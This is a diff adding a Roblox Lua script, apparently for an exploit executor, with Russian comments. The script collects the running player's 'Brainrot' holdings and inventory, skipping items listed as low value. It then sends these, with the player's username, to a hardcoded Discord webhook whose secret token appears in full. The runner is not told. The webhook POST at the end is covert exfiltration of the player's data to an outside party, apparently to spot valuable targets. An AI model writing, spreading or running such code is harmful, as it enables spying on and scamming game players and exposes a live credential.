@@ -1,1 +1,124 @@
-g
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+
+local localPlayer = Players.LocalPlayer
+
+-- Черный список точных предметов
+local blacklist = {
+    ["Shovel[Pick Up Plants]"] = true,
+    ["Bat"] = true,
+    ["Carrot Launcher"] = true,
+    ["Frost Blower"] = true,
+    ["Frost Grenade"] = true,
+    ["Banana Gun"] = true,
+    ["Water Bucket"] = true
+}
+
+-- === Поиск своего плота ===
+local function findPlayerPlot()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
+            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
+            if label and label.Text == localPlayer.DisplayName then
+                return plot
+            end
+        end
+    end
+    return nil
+end
+
+-- === Сбор Brainrots ===
+local function collectBrainrots(plot)
+    local brainrotsText = ""
+    local container = plot:FindFirstChild("Brainrots")
+    if not container then
+        return "❌ Нет Brainrots"
+    end
+
+    for i = 1, 17 do
+        local node = container:FindFirstChild(tostring(i))
+        if node and node:FindFirstChild("Brainrot") then
+            local br = node.Brainrot
+            local ui = br:FindFirstChild("PlatformUI")
+            if ui and ui:FindFirstChild("Title") then
+                local text = ui.Title.Text
+                if text and text ~= "" then
+                    brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
+                end
+            end
+        end
+    end
+
+    if brainrotsText == "" then
+        brainrotsText = "⚠️ Пусто"
+    end
+    return brainrotsText
+end
+
+-- === Сбор инвентаря с фильтром ===
+local function collectInventory()
+    local invText = ""
+    local items = {}
+
+    local function addItemsFrom(container)
+        if not container then return end
+        for _, item in ipairs(container:GetChildren()) do
+            if item:IsA("Tool") then
+                -- фильтруем по blacklist и seed
+                if not blacklist[item.Name] and not string.find(item.Name, "Seed") then
+                    table.insert(items, item.Name)
+                end
+            end
+        end
+    end
+
+    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
+    addItemsFrom(localPlayer.Character)
+
+    if #items == 0 then
+        invText = "\n⚠️ Инвентарь пуст или все предметы заблокированы"
+    else
+        invText = "\n--- Inventory ---\n"
+        for _, name in ipairs(items) do
+            invText = invText .. "- " .. name .. "\n"
+        end
+    end
+
+    return invText
+end
+
+-- === Основной запуск ===
+local plot = findPlayerPlot()
+local brainrots = plot and collectBrainrots(plot) or "❌ Plot не найден"
+brainrots = brainrots .. collectInventory() -- объединяем Brainrots + Inventory
+
+-- === Отправка в Discord ===
+request({
+    Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode({
+        ["embeds"] = {{
+            ["title"] = "**Brainrots Report**",
+            ["color"] = 65280,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Username",
+                    ["value"] = localPlayer.Name,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🪐 Brainrots + Inventory",
+                    ["value"] = brainrots,
+                    ["inline"] = false
+                }
+            }
+        }}
+    })
+})
